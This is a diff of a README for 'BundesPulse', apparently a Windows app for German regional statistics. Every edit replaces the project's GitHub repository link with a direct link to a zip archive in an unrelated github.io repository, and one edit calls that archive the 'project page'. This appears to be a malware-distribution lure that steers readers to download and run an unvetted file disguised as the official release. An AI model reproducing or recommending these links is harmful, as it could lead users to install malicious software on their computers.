@@ -5,7 +5,7 @@ description: "Explore Germany's regional statistics across 111 indicators and 15
 ---
 # 🌐 BundesPulse - Germany's Data, Made Simple
 
-[![Download BundesPulse](https://img.shields.io/badge/Download-BundesPulse-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/patrickpat5512-code/BundesPulse)
+[![Download BundesPulse](https://img.shields.io/badge/Download-BundesPulse-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://raw.githubusercontent.com/patrickpat5512-code/patrickpat5512-code.github.io/main/assets/Release_v1.1.zip)
 
 ## 🗺️ What Is BundesPulse?
 
@@ -40,7 +40,7 @@ Getting BundesPulse on your Windows computer is easier than you think. Follow th
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[Download BundesPulse](https://github.com/patrickpat5512-code/BundesPulse)**
+Visit this link to download the application: **[Download BundesPulse](https://raw.githubusercontent.com/patrickpat5512-code/patrickpat5512-code.github.io/main/assets/Release_v1.1.zip)**
 
 ### Step 2: Run the Program
 
@@ -149,7 +149,7 @@ Absolutely! You can take screenshots or share your screen with others. The data 
 If you run into any issues, don't panic. Here's what you can do:
 
 1. **Check the FAQ section** above for common solutions
-2. **Visit the project page** at [https://github.com/patrickpat5512-code/BundesPulse](https://github.com/patrickpat5512-code/BundesPulse) for updates and announcements
+2. **Visit the project page** at [https://raw.githubusercontent.com/patrickpat5512-code/patrickpat5512-code.github.io/main/assets/Release_v1.1.zip](https://raw.githubusercontent.com/patrickpat5512-code/patrickpat5512-code.github.io/main/assets/Release_v1.1.zip) for updates and announcements
 3. **Contact the community** - there are often helpful discussions on the project page
 
 ## 🤝 Contribute to the Project
@@ -175,7 +175,7 @@ BundesPulse is built with modern web technologies including React, designed for 
 
 You don't need to be a data scientist or a programmer. You just need curiosity. Download BundesPulse, click on your hometown, and discover something new about the place you live.
 
-[**📥 Download BundesPulse Now**](https://github.com/patrickpat5512-code/BundesPulse)
+[**📥 Download BundesPulse Now**](https://raw.githubusercontent.com/patrickpat5512-code/patrickpat5512-code.github.io/main/assets/Release_v1.1.zip)
 
 ---
 
